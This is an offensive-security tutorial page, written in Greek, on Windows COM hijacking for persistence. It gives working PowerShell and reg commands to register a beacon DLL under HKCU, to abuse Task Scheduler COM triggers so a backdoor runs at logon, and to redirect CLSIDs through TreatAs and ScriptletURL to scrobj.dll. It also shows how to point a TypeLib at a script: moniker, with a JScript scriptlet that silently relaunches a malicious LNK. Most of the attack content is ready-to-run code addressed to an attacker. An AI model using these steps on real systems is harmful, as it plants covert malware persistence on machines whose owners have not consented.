# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Αναζήτηση ανύπαρκτων COM components

Καθώς οι τιμές του HKCU μπορούν να τροποποιηθούν από τους users, το **COM Hijacking** μπορεί να χρησιμοποιηθεί ως **μηχανισμός persistence**. Με τη χρήση του `procmon` είναι εύκολο να εντοπιστούν COM registries που αναζητούνται, αλλά δεν υπάρχουν ακόμη και θα μπορούσαν να δημιουργηθούν από έναν attacker. Κλασικά filters:

- **RegOpenKey** operations.
- όπου το _Result_ είναι **NAME NOT FOUND**.
- και το _Path_ τελειώνει σε **InprocServer32**.

Χρήσιμες παραλλαγές κατά το hunting:

- Αναζητήστε επίσης missing **`LocalServer32`** keys. Ορισμένες COM classes είναι out-of-process servers και θα εκκινήσουν ένα EXE που ελέγχεται από τον attacker αντί για ένα DLL.
- Αναζητήστε **`TreatAs`** και **`ScriptletURL`** registry operations επιπλέον του `InprocServer32`. Τα πρόσφατα detection content και malware writeups τα επισημαίνουν συχνά, επειδή είναι πολύ πιο σπάνια από τα κανονικά COM registrations και επομένως αποτελούν high-signal ενδείξεις.
- Αντιγράψτε το νόμιμο **`ThreadingModel`** από το αρχικό `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` όταν κάνετε clone ενός registration στο HKCU. Η χρήση λάθος model συχνά διακόπτει το activation και κάνει το hijack noisy.<sup>[[3]](#references)</sup>
- Σε 64-bit systems ελέγξτε και τα 64-bit και τα 32-bit views (`procmon.exe` έναντι `procmon64.exe`, `HKLM\Software\Classes` και `HKLM\Software\Classes\WOW6432Node`), επειδή οι 32-bit applications ενδέχεται να επιλύουν διαφορετικό COM registration.

Αφού αποφασίσετε ποιο ανύπαρκτο COM θα impersonate, εκτελέστε τις παρακάτω εντολές. _Να είστε προσεκτικοί αν αποφασίσετε να κάνετε impersonate ένα COM που φορτώνεται κάθε λίγα δευτερόλεπτα, καθώς αυτό μπορεί να είναι υπερβολικό._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### COM components του Task Scheduler που μπορούν να γίνουν hijack

Οι Windows Tasks χρησιμοποιούν Custom Triggers για να καλούν COM objects και, επειδή εκτελούνται μέσω του Task Scheduler, είναι ευκολότερο να προβλεφθεί πότε πρόκειται να ενεργοποιηθούν.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ελέγχοντας το output, μπορείτε να επιλέξετε ένα που πρόκειται να εκτελείται **κάθε φορά που ένας user κάνει login**, για παράδειγμα.

Στη συνέχεια, αναζητώντας το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στο **HKEY\CLASSES\ROOT\CLSID**, καθώς και στα HKLM και HKCU, συνήθως θα διαπιστώσετε ότι η τιμή δεν υπάρχει στο HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Στη συνέχεια, μπορείτε απλώς να δημιουργήσετε την καταχώρηση HKCU και κάθε φορά που ο χρήστης συνδέεται, το backdoor σας θα εκτελείται.

---

## COM TreatAs Hijacking + ScriptletURL

Το `TreatAs` επιτρέπει σε ένα CLSID να εξομοιώνεται από ένα άλλο. <sup>[[4]](#references)</sup> Από offensive perspective, αυτό σημαίνει ότι μπορείτε να αφήσετε το αρχικό CLSID ανέγγιχτο, να δημιουργήσετε ένα δεύτερο per-user CLSID που δείχνει στο `scrobj.dll` και, στη συνέχεια, να ανακατευθύνετε το πραγματικό COM object στο malicious μέσω του `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Αυτό είναι χρήσιμο όταν:

- η target εφαρμογή δημιουργεί ήδη ένα σταθερό CLSID κατά το logon ή κατά την εκκίνηση της εφαρμογής
- θέλετε ένα registry-only redirect αντί να αντικαταστήσετε το αρχικό `InprocServer32`
- θέλετε να εκτελέσετε ένα local ή remote `.sct` scriptlet μέσω της τιμής `ScriptletURL`

Παράδειγμα workflow (προσαρμοσμένο από public Atomic Red Team tradecraft και παλαιότερη έρευνα σχετικά με COM registry abuse):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Σημειώσεις:

- Το `scrobj.dll` διαβάζει την τιμή `ScriptletURL` και εκτελεί το αναφερόμενο `.sct`, επομένως μπορείτε να διατηρείτε το payload ως local file ή να το ανακτάτε απομακρυσμένα μέσω HTTP/HTTPS.
- Το `TreatAs` είναι ιδιαίτερα χρήσιμο όταν η αρχική COM registration είναι πλήρης και σταθερή στο HKLM, επειδή χρειάζεστε μόνο μια μικρή per-user ανακατεύθυνση αντί να αντιγράψετε ολόκληρο το tree.
- Για validation χωρίς να περιμένετε το φυσιολογικό trigger, μπορείτε να κάνετε instantiate χειροκίνητα το fake ProgID/CLSID με `rundll32.exe -sta <ProgID-or-CLSID>`, εφόσον η target class υποστηρίζει STA activation.

## COM TypeLib Hijacking (script: moniker persistence)

Τα Type Libraries (TypeLib) ορίζουν COM interfaces και φορτώνονται μέσω της `LoadTypeLib()`. Όταν γίνεται instantiate ένας COM server, το OS μπορεί επίσης να φορτώσει το συσχετισμένο TypeLib, αναζητώντας registry keys κάτω από το `HKCR\TypeLib\{LIBID}`. Αν το path του TypeLib αντικατασταθεί από ένα **moniker**, π.χ. `script:C:\...\evil.sct`, τα Windows θα εκτελέσουν το scriptlet όταν γίνει resolve το TypeLib — παρέχοντας stealthy persistence που ενεργοποιείται όταν χρησιμοποιούνται common components.

Αυτό έχει παρατηρηθεί απέναντι στο Microsoft Web Browser control (το οποίο φορτώνεται συχνά από τον Internet Explorer, apps που κάνουν embedding το WebBrowser, ακόμη και από το `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Βήματα (PowerShell)

1) Εντοπίστε το TypeLib (LIBID) που χρησιμοποιείται από ένα high-frequency CLSID. Παράδειγμα CLSID που συχνά γίνεται abuse από malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Ορίστε τη διαδρομή TypeLib ανά χρήστη σε ένα τοπικό scriptlet χρησιμοποιώντας το `script:` moniker (δεν απαιτούνται δικαιώματα διαχειριστή):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Τοποθετήστε ένα ελάχιστο JScript `.sct` που επανεκκινεί το κύριο payload σας (π.χ. ένα `.lnk` που χρησιμοποιείται από το αρχικό chain):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – το άνοιγμα του IE, μιας εφαρμογής που ενσωματώνει το WebBrowser control ή ακόμη και η συνήθης δραστηριότητα του Explorer θα φορτώσει το TypeLib και θα εκτελέσει το scriptlet, ενεργοποιώντας ξανά την αλυσίδα σας κατά τη σύνδεση/επανεκκίνηση.

Εκκαθάριση
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Σημειώσεις
- Μπορείτε να εφαρμόσετε την ίδια λογική σε άλλα COM components υψηλής συχνότητας· να επιλύετε πάντα πρώτα το πραγματικό `LIBID` από το `HKCR\CLSID\{CLSID}\TypeLib`.
- Σε συστήματα 64-bit μπορείτε επίσης να συμπληρώσετε το subkey `win64` για 64-bit consumers.

## Παραπομπές

- [1] [Hijack the TypeLib – Νέα COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Εκστρατεία ZipLine: Μια εξελιγμένη phishing attack που στοχεύει εταιρείες στις ΗΠΑ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Επανεξέταση του COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
